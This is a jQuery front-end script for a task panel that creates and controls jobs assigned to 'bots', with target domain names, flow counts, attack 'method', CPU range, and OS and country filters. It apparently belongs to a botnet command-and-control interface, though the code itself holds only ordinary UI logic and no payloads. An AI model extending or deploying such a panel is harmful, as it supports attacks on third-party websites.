/*var tasksTable = $('#currenttasks').dataTable({bFilter: false, bInfo: false, bPaginate: false, bSort: false}); // bFilter: false, bInfo: false, bPaginate: false, sScrollX: "100%", bSort: false
$(window).bind('resize', function () {
    tasksTable.fnAdjustColumnSizing();
} );*/

$(document).ready(function() {
    //$(".collapse").collapse()
    tasksList.updateTasks();
});

const tasksList = {
    updateTasks: function() {
        $.get(document.location.pathname + '/get_tasks_list')
            .success(function (res) {
                $('[data-tasks-list]').empty();
                $('[data-tasks-list]').append(res);
            });
    }
};

const tasksListRow = {
    startTask: function(task_id) {
        updateTaskStatus(task_id, 'start');
    },
    stopTask: function(task_id) {
        updateTaskStatus(task_id, 'stop');
    },
    pauseTask: function(task_id) {
        updateTaskStatus(task_id, 'pause');
    },
    deleteTask: function(task_id) {
        updateTaskStatus(task_id, 'delete');
    }
}

function updateTaskStatus(task_id, type) {
    $.post(document.location.pathname + '/updtask', {task_id: task_id, action: type})
        .success(function(res) {
            tasksList.updateTasks();
        });
}

$.jGrowl.defaults.position = 'bottom-right';

$('.select2-container-multi').show();

$('.unselect_all').on("click", function () {
    id = $(this).parent().attr('for');
    $('#' + id).select2('destroy').find('option').prop('selected', false).end().select2();
});

$(".select_all").on("click", function () {
    id = $(this).parent().attr('for');
    $('#' + id).select2('destroy').find('option').prop('selected', 'selected').end().select2();
});

$("#slider-range-min-bots").slider({
    range: "min",
    value: bots_count_value / 2,
    min: 1,
    max: bots_count_value,
    slide: function( event, ui ) {
        $( "#bots-amount" ).val( ui.value );
    }
});
$( "#bots-amount" ).val( $( "#slider-range-min-bots" ).slider( "value" ) );

$( "#range-slider-cpu" ).slider({
    range: true,
    min: 0,
    max: 500,
    values: [ 75, 300 ],
    slide: function( event, ui ) {
        $( "#cpu-amount" ).val( "$" + ui.values[ 0 ] + " - $" + ui.values[ 1 ] );
    }
});
$( "#cpu-amount" ).val( $( "#range-slider-cpu" ).slider( "values", 0 ) +
    " - " + $( "#range-slider-cpu" ).slider( "values", 1 ) );

var saveResult = function (data) {
    ion_from = data.from;
    ion_to = data.to;
};

/*$("#cpu").ionRangeSlider({
    min: 1,
    onChange: saveResult,
    onFinish: saveResult
});*/

/*$("#bots").ionRangeSlider({
    min: 1,
    max: bots_count_value,
    from: bots_count_value / 2
});*/

$('#tasks i.fa-trash-o,i.fa-stop-circle-o,i.fa-play-circle-o').click(function () {
    task_id = $(this).parents('tr').attr('id');
    type = $(this).data('type');

    $.post(document.location.pathname + '/updtask', {task_id: task_id, action: type});

    type_msg = {'delete':'deleted','stop':'stoped','start':'started'};

    $.jGrowl('Task successfully '+type_msg[type], { sticky: false, theme: 'growl-success', header: 'Success!', life: 3000 });

    if(type == "delete"){
        $(this).parents('tr').remove();
    }

});

$('#country_block').hide();
$('#use_countries').on("change", function(){
    if ($('#use_countries').is(":checked") == false) {
        console.log('hide');
        //$('#country_block').prop( "disabled", true );
        $('#country_block').hide(200);
    } else {
        console.log('show');
        //$('#country_block').prop( "disabled", false );
        $('#country_block').show(200);
    }
});

$('#os_block').hide();
$('#use_os').on("change", function(){
    if ($('#use_os').is(":checked") == false) {
        $('#os_block').hide(200);
    } else {
        $('#os_block').show(200);
    }
});

$('#create_task').click(function(e){
    e.preventDefault();
    var arrValues= new Array();
    /*$('input').each(function(){
        if ($(this).attr('id') == 'cpu') {
            arrValues[$(this).attr('id')] = ion_from + ';' + ion_to;
        } else {
            arrValues[$(this).attr('id')] = $(this).val();
        }
    });*/
    arrValues['bots'] = $('#bots').val();
    arrValues['bot_ids'] = $('#bot-ids').val();
    arrValues['flows'] = $('#flows').val();
    arrValues['domain_names'] = $('#domain-names').val();
    arrValues['cpu'] = $('#cpu').val();//ion_from + ';' + ion_to; or 0

    if ($('#use_os').is(":checked") == false) {
        arrValues['os'] = 0;
    } else {
        arrValues['os'] = $('#os').val();//$('#os').select2('val');
    }
    if ($('#use_countries').is(":checked") == false) {
        arrValues['country'] = 0;
    } else {
        arrValues['country'] = $('#countries').val();//$('#countries').select2('val');
    }
    arrValues['method_type'] = $('#method').val();
    arrValues['context'] = $('#context').val();
    if ($('#flags').val() == '') {
        arrValues['flags'] = 0;
    } else {
        arrValues['flags'] = $('#flags').val();
    }

    $.ajax({
        type: "post",
        url: "/tasks/newtask",
        data: Object.assign({}, arrValues),
        success: function(res) {
            $('#form_modal').modal('hide');
            if (res == '1') {
                // clear form
                $('#os').select2('destroy').find('option').prop('selected', false).end().select2();
                $('#countries').select2('destroy').find('option').prop('selected', false).end().select2();
                $('#context').val('');
                $.jGrowl('Task added.', { sticky: false, theme: 'growl-success', header: 'Success!', life: 3000 });
                tasksList.updateTasks();
            } else {
                $.jGrowl('Task not added.', { sticky: false, theme: 'growl-error', header: 'Error!', life: 3000 });
            }
        }
    });
});